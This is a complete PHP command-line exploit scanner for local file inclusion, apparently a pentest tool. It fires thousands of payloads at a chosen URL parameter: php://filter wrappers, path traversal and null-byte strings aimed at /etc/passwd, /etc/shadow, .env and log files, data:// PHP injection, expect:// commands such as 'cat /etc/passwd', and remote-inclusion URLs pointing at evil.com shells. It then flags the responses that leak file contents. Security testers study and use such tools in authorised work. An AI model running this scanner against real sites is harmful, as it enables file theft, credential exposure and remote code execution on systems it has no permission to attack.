#!/usr/bin/env php
<?php

class LFIWrapperScanner {
    private $colors;
    private $successCount = 0;
    private $testedCount = 0;
    private $proxy = null;
    private $verifiedVulnerabilities = [];
    
    public function __construct() {
        $this->initColors();
        $this->detectProxy();
    }
    
    private function detectProxy() {
        $proxyEnvVars = ['HTTP_PROXY', 'HTTPS_PROXY', 'http_proxy', 'https_proxy'];
        foreach ($proxyEnvVars as $envVar) {
            if ($proxy = getenv($envVar)) {
                $this->proxy = $proxy;
                $this->printStatus("Detected proxy: " . $proxy, 'info');
                break;
            }
        }
    }
    
    public function setProxy($proxy) {
        $this->proxy = $proxy;
    }
    
    private function initColors() {
        $this->colors = [
            'red' => "\033[31m",
            'green' => "\033[32m",
            'yellow' => "\033[33m",
            'blue' => "\033[34m",
            'magenta' => "\033[35m",
            'cyan' => "\033[36m",
            'reset' => "\033[0m",
            'bold' => "\033[1m"
        ];
    }
    
    private function color($text, $color) {
        return $this->colors[$color] . $text . $this->colors['reset'];
    }
    
    private function printStatus($message, $type = 'info') {
        $timestamp = date('H:i:s');
        $colors = [
            'info' => 'blue',
            'success' => 'green',
            'warning' => 'yellow',
            'error' => 'red',
            'testing' => 'cyan',
            'verified' => 'magenta'
        ];
        
        echo "[{$timestamp}] " . $this->color($message, $colors[$type]) . "\n";
    }
    
    public function generateWrappers($baseUrl, $param, $testFile = '/etc/passwd') {
        $wrappers = [];
        
        // === PHP FILTER WRAPPERS ===
        $basicWrappers = [
            'php://filter/convert.base64-encode/resource=',
            'php://filter/read=convert.base64-encode/resource=',
            'php://filter/convert.iconv.utf-8.utf-16/resource=',
            'php://filter/convert.iconv.utf-8.utf-16be/resource=',
            'php://filter/convert.iconv.utf-16.utf-8/resource=',
            'php://filter/convert.iconv.utf-16le.utf-8/resource=',
            'php://filter/zlib.deflate/convert.base64-encode/resource=',
            'php://filter/read=string.rot13/resource=',
            'php://filter/convert.quoted-printable-encode/resource=',
            'php://filter/read=convert.quoted-printable-encode/resource=',
            'php://filter/string.strip_tags/resource=',
            'php://filter/convert.base64-decode/resource=',
        ];
        
        // === PATH TRAVERSAL PAYLOADS ===
        $traversalPayloads = [
            '../../../../../../../../../../../../../../../../../../../../../../',
            '..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f',
            '..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f',
            '....//....//....//....//....//....//....//....//',
            '..\\..\\..\\..\\..\\..\\..\\..\\',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f',
            '..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af',
        ];
        
        // === TEST FILES FOR DIFFERENT OS ===
        $testFiles = [
            // Linux/Unix
            '/etc/passwd',
            '/etc/hosts',
            '/etc/shadow',
            '/etc/group',
            '/etc/hostname',
            '/proc/self/environ',
            '/proc/version',
            '/proc/cmdline',
            '/etc/passwd%00',
            '/etc/passwd%00.jpg',
            '/etc/passwd\0',
            
            // Windows
            'c:\\windows\\system32\\drivers\\etc\\hosts',
            'c:/windows/system32/drivers/etc/hosts',
            '..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            'c:\\boot.ini',
            'c:/boot.ini',
            
            // Log files
            '/var/log/apache2/access.log',
            '/var/log/apache/access.log',
            '/var/log/nginx/access.log',
            '/var/log/httpd/access_log',
            '/var/log/auth.log',
            '/var/log/syslog',
            
            // Config files
            '/etc/ssh/sshd_config',
            '/etc/mysql/my.cnf',
            '/etc/php/8.2/apache2/php.ini',
            '/etc/apache2/apache2.conf',
            '/.env',
            'config/database.php',
            
            // Session files
            '/var/lib/php/sessions/sess_',
            '/tmp/sess_',
            
            // Special files
            '/dev/null',
            '/dev/zero',
            '/dev/random',
        ];
        
        // === ENCODING VARIATIONS ===
        $encodings = [
            'base64',
            'rot13', 
            'quoted-printable',
            'zlib.deflate',
            'zlib.inflate',
            'bzip2.compress',
            'bzip2.decompress',
        ];
        
        // === COMPLEX WRAPPERS ===
        $complexWrappers = [
            'php://filter/convert.base64-encode|convert.base64-encode/resource=',
            'php://filter/convert.iconv.utf-8.utf-16|convert.base64-encode/resource=',
            'php://filter/zlib.deflate/convert.base64-encode/convert.base64-encode/resource=',
            'php://filter/read=string.rot13|string.rot13|convert.base64-encode/resource=',
            'php://filter/convert.quoted-printable-encode|convert.base64-encode/resource=',
            'php://filter/string.toupper|convert.base64-encode/resource=',
            'php://filter/string.tolower|convert.base64-encode/resource=',
        ];
        
        // === GENERATE BASIC WRAPPERS ===
        foreach ($basicWrappers as $wrapper) {
            foreach ($testFiles as $file) {
                $wrappers[] = $wrapper . $file;
            }
        }
        
        // === GENERATE COMPLEX WRAPPERS ===
        foreach ($complexWrappers as $wrapper) {
            foreach ($testFiles as $file) {
                $wrappers[] = $wrapper . $file;
            }
        }
        
        // === GENERATE TRAVERSAL PAYLOADS ===
        foreach ($traversalPayloads as $traversal) {
            foreach ($testFiles as $file) {
                $wrappers[] = $traversal . $file;
                // Z wrapperem
                foreach ($basicWrappers as $wrapper) {
                    $wrappers[] = $wrapper . $traversal . $file;
                }
            }
        }
        
        // === DATA WRAPPERS ===
        $testContent = base64_encode("<?php echo 'VULNERABLE'; ?>");
        $dataWrappers = [
            'data://text/plain;base64,' . $testContent,
            'data://text/plain,' . urlencode("<?php echo 'VULNERABLE'; ?>"),
            'data://text/plain;charset=base64,' . $testContent,
            'data://text/plain;charset=us-ascii,' . $testContent,
        ];
        $wrappers = array_merge($wrappers, $dataWrappers);
        
        // === EXPECT WRAPPERS ===
        $expectWrappers = [
            'expect://whoami',
            'expect://id',
            'expect://ls',
            'expect://pwd',
            'expect://cat /etc/passwd',
            'expect://uname -a',
        ];
        $wrappers = array_merge($wrappers, $expectWrappers);
        
        // === RFI WRAPPERS ===
        $rfiWrappers = [
            'http://evil.com/shell.txt',
            'https://raw.githubusercontent.com/evil/shell/master/shell.php',
            'ftp://user:pass@evil.com/shell.txt',
            'phar://evil.com/shell.phar',
        ];
        $wrappers = array_merge($wrappers, $rfiWrappers);
        
        // === NULL BYTE INJECTION ===
        $nullByteWrappers = [];
        foreach ($testFiles as $file) {
            $nullByteWrappers[] = $file . '%00';
            $nullByteWrappers[] = $file . '%00.jpg';
            $nullByteWrappers[] = $file . '\0';
            $nullByteWrappers[] = $file . '\\0';
        }
        $wrappers = array_merge($wrappers, $nullByteWrappers);
        
        return array_unique($wrappers);
    }
    
    public function testUrl($url, $timeout = 10) {
        $ch = curl_init();
        
        $curlOptions = [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => $timeout,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS => 5,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            CURLOPT_HEADER => true,
        ];
        
        if ($this->proxy) {
            $curlOptions[CURLOPT_PROXY] = $this->proxy;
            $curlOptions[CURLOPT_HTTPPROXYTUNNEL] = true;
        }
        
        curl_setopt_array($ch, $curlOptions);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $totalTime = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
        $error = curl_error($ch);
        
        curl_close($ch);
        
        return [
            'response' => $response,
            'http_code' => $httpCode,
            'total_time' => $totalTime,
            'error' => $error,
            'success' => ($httpCode == 200 && !empty($response))
        ];
    }
    
    public function verifyVulnerability($response, $wrapper) {
        $content = $response['response'];
        $indicators = [
            // Linux/Unix files
            'root:x:0:0' => ['confidence' => 'high', 'type' => 'LFI', 'file' => '/etc/passwd'],
            'root:*:' => ['confidence' => 'high', 'type' => 'LFI', 'file' => '/etc/shadow'],
            'daemon:x:1:1' => ['confidence' => 'high', 'type' => 'LFI', 'file' => '/etc/passwd'],
            '127.0.0.1' => ['confidence' => 'medium', 'type' => 'LFI', 'file' => '/etc/hosts'],
            'root:' => ['confidence' => 'medium', 'type' => 'LFI', 'file' => '/etc/group'],
            'Linux' => ['confidence' => 'medium', 'type' => 'LFI', 'file' => '/proc/version'],
            'PATH=' => ['confidence' => 'high', 'type' => 'LFI', 'file' => '/proc/self/environ'],
            
            // Windows files
            'localhost' => ['confidence' => 'medium', 'type' => 'LFI', 'file' => 'hosts'],
            '[boot loader]' => ['confidence' => 'high', 'type' => 'LFI', 'file' => 'boot.ini'],
            
            // PHP execution
            'VULNERABLE' => ['confidence' => 'high', 'type' => 'RCE', 'file' => 'data wrapper'],
            
            // Base64 encoded content patterns
            'cm9vdDp4OjA6MA' => ['confidence' => 'high', 'type' => 'LFI', 'file' => 'base64 /etc/passwd'], // base64 of "root:x:0:0"
            'ZGFlbW9u' => ['confidence' => 'high', 'type' => 'LFI', 'file' => 'base64 /etc/passwd'], // base64 of "daemon"
            
            // Command execution
            'uid=' => ['confidence' => 'high', 'type' => 'RCE', 'file' => 'command execution'],
            'www-data' => ['confidence' => 'high', 'type' => 'RCE', 'file' => 'command execution'],
            '/home/' => ['confidence' => 'medium', 'type' => 'RCE', 'file' => 'command execution'],
            
            // Log files
            'GET /' => ['confidence' => 'medium', 'type' => 'LFI', 'file' => 'access log'],
            'POST /' => ['confidence' => 'medium', 'type' => 'LFI', 'file' => 'access log'],
            
            // Config files
            'AllowUsers' => ['confidence' => 'medium', 'type' => 'LFI', 'file' => 'sshd_config'],
            'extension=' => ['confidence' => 'medium', 'type' => 'LFI', 'file' => 'php.ini'],
        ];
        
        // chck for exact content matches
        foreach ($indicators as $pattern => $info) {
            if (strpos($content, $pattern) !== false) {
                return $info;
            }
        }
        
        // chck for base64 encoded content
        if (preg_match('/^[A-Za-z0-9+\/=]{20,}$/', substr($content, 0, 200))) {
            $decoded = base64_decode(substr($content, 0, 500), true);
            if ($decoded !== false) {
                // chck decoded content
                foreach ($indicators as $pattern => $info) {
                    if (strpos($decoded, $pattern) !== false) {
                        return ['confidence' => 'high', 'type' => 'LFI', 'file' => 'base64 encoded ' . $info['file']];
                    }
                }
            }
        }
        
        // ROT13 content
        $rot13 = str_rot13(substr($content, 0, 500));
        foreach ($indicators as $pattern => $info) {
            if (strpos($rot13, $pattern) !== false) {
                return ['confidence' => 'high', 'type' => 'LFI', 'file' => 'ROT13 encoded ' . $info['file']];
            }
        }
        
        // chck response length (unusual lengths might indicate success)
        $contentLength = strlen($content);
        if ($contentLength > 1000 && $contentLength < 10000) {
            return ['confidence' => 'low', 'type' => 'potential', 'file' => 'unusual response size'];
        }
        
        return null;
    }
    
    public function scan($targetUrl, $parameter, $testFile = '/etc/passwd') {
        $this->printStatus("Starting LFI Wrapper Scanner against: " . $targetUrl, 'info');
        $this->printStatus("Testing parameter: " . $parameter, 'info');
        $this->printStatus("Test file: " . $testFile, 'info');
        if ($this->proxy) {
            $this->printStatus("Using proxy: " . $this->proxy, 'info');
        }
        echo str_repeat("-", 80) . "\n";
        
        // test connection 
        $this->printStatus("Testing connection to target...", 'testing');
        $testResponse = $this->testUrl($targetUrl);
        
        if ($testResponse['error']) {
            $this->printStatus("Connection error: " . $testResponse['error'], 'error');
            $this->printStatus("If you're behind proxy, use: --proxy http://proxy:port", 'warning');
            return;
        } else {
            $this->printStatus("Connection successful. HTTP Code: " . $testResponse['http_code'], 'success');
        }
        
        $wrappers = $this->generateWrappers($targetUrl, $parameter, $testFile);
        $results = [];
        
        $this->printStatus("Generated " . count($wrappers) . " payloads", 'info');
        
        foreach ($wrappers as $i => $wrapper) {
            $this->testedCount++;
            $testUrl = $targetUrl . (strpos($targetUrl, '?') === false ? '?' : '&') . $parameter . '=' . urlencode($wrapper);
            
            $this->printStatus("Testing [" . ($i + 1) . "/" . count($wrappers) . "]: " . $wrapper, 'testing');
            
            $response = $this->testUrl($testUrl);
            
            if ($response['error']) {
                $this->printStatus("✗ Request failed: " . $response['error'], 'error');
                continue;
            }
            
            // ? actually vulnerable
            $verification = $this->verifyVulnerability($response, $wrapper);
            
            if ($verification) {
                $this->successCount++;
                
                $status = $this->color('VULNERABLE', 'green');
                $confidenceColor = 'green';
                if ($verification['confidence'] === 'high') {
                    $status = $this->color('HIGHLY VULNERABLE', 'red');
                    $confidenceColor = 'red';
                } elseif ($verification['confidence'] === 'medium') {
                    $status = $this->color('LIKELY VULNERABLE', 'yellow');
                    $confidenceColor = 'yellow';
                }
                
                $this->printStatus("✓ " . $status . " - " . $wrapper, 'success');
                $this->printStatus("  Type: " . $verification['type'] . " | File: " . $verification['file'], 'verified');
                $this->printStatus("  HTTP Code: " . $response['http_code'] . " | Time: " . round($response['total_time'], 2) . "s", 'info');
                
                $results[] = [
                    'wrapper' => $wrapper,
                    'url' => $testUrl,
                    'confidence' => $verification['confidence'],
                    'type' => $verification['type'],
                    'file' => $verification['file'],
                    'response' => substr($response['response'], 0, 500),
                    'http_code' => $response['http_code'],
                    'verified' => true
                ];
                
                $this->saveFinding($results[count($results)-1]);
                
                // verified vulnerabilities
                $this->verifiedVulnerabilities[] = $results[count($results)-1];
            } else {
                $this->printStatus("✗ Not vulnerable - " . $wrapper, 'error');
            }
            
            usleep(50000); // 50ms
        }
        
        $this->generateReport($results);
    }
    
    private function saveFinding($finding) {
        $filename = 'lfi_findings_' . date('Y-m-d_H-i-s') . '.txt';
        $content = "=== LFI Finding ===\n";
        $content .= "Wrapper: " . $finding['wrapper'] . "\n";
        $content .= "URL: " . $finding['url'] . "\n";
        $content .= "Type: " . $finding['type'] . "\n";
        $content .= "File: " . $finding['file'] . "\n";
        $content .= "Confidence: " . $finding['confidence'] . "\n";
        $content .= "HTTP Code: " . $finding['http_code'] . "\n";
        $content .= "Verified: " . ($finding['verified'] ? 'YES' : 'NO') . "\n";
        $content .= "Response preview:\n" . $finding['response'] . "\n";
        $content .= "==================\n\n";
        
        file_put_contents($filename, $content, FILE_APPEND | LOCK_EX);
    }
    
    private function generateReport($results) {
        echo "\n" . str_repeat("=", 80) . "\n";
        $this->printStatus("SCAN COMPLETED", 'info');
        $this->printStatus("Total tests: " . $this->testedCount, 'info');
        $this->printStatus("Potential vulnerabilities: " . $this->successCount, $this->successCount > 0 ? 'success' : 'warning');
        $this->printStatus("Verified vulnerabilities: " . count($this->verifiedVulnerabilities), count($this->verifiedVulnerabilities) > 0 ? 'success' : 'warning');
        
        if (!empty($this->verifiedVulnerabilities)) {
            $this->printStatus("\nVERIFIED VULNERABILITIES:", 'success');
            foreach ($this->verifiedVulnerabilities as $result) {
                $color = $result['confidence'] === 'high' ? 'red' : ($result['confidence'] === 'medium' ? 'yellow' : 'green');
                echo $this->color("[" . strtoupper($result['confidence']) . "]", $color) . " ";
                echo $this->color("[" . $result['type'] . "]", 'cyan') . " ";
                echo $result['url'] . "\n";
                echo "     File: " . $result['file'] . "\n";
            }
        }
        
        $this->printStatus("\nFindings saved to: lfi_findings_*.txt", 'info');
    }
    
    public function showBanner() {
        $banner = $this->color("
                           _          _____      
 __      ___ __ __ _ _ __ | |__  _ __|___ / _ __ 
 \ \ /\ / / '__/ _` | '_ \| '_ \| '_ \ |_ \| '__|
  \ V  V /| | | (_| | |_) | | | | |_) |__) | |   
   \_/\_/ |_|  \__,_| .__/|_| |_| .__/____/|_|   
                    |_|         |_|              
                                                                  
        ", 'cyan') . "
        " . $this->color("LFI Wrapper Scanner", 'yellow') . "
        " . $this->color("PHP Wrapper-based LFI Detection Tool", 'blue') . "
        " . $this->color("Author: csshark", 'magenta') . "
        
        ";
        
        echo $banner;
    }
}

if (php_sapi_name() !== 'cli') {
    die("This script must be run from command line\n");
}

$scanner = new LFIWrapperScanner();
$scanner->showBanner();

$targetUrl = null;
$parameter = null;
$testFile = '/etc/passwd';
$proxy = null;

for ($i = 1; $i < $argc; $i++) {
    if ($argv[$i] === '--proxy' && isset($argv[$i + 1])) {
        $proxy = $argv[$i + 1];
        $i++;
    } elseif ($argv[$i] === '--file' && isset($argv[$i + 1])) {
        $testFile = $argv[$i + 1];
        $i++;
    } elseif (!$targetUrl) {
        $targetUrl = $argv[$i];
    } elseif (!$parameter) {
        $parameter = $argv[$i];
    }
}

if (!$targetUrl || !$parameter) {
    echo "Usage: php " . $argv[0] . " <target_url> <parameter> [options]\n";
    echo "Example: php " . $argv[0] . " \"http://example.com/vuln.php\" \"file\"\n";
    echo "Example: php " . $argv[0] . " \"http://example.com/page.php\" \"page\" --file \"/etc/hosts\" --proxy \"http://proxy:8080\"\n";
    echo "\nOptions:\n";
    echo "  --proxy <proxy>    Set proxy (http://proxy:port)\n";
    echo "  --file <file>      Set test file (default: /etc/passwd)\n";
    exit(1);
}

if ($proxy) {
    $scanner->setProxy($proxy);
}

$scanner->scan($targetUrl, $parameter, $testFile);
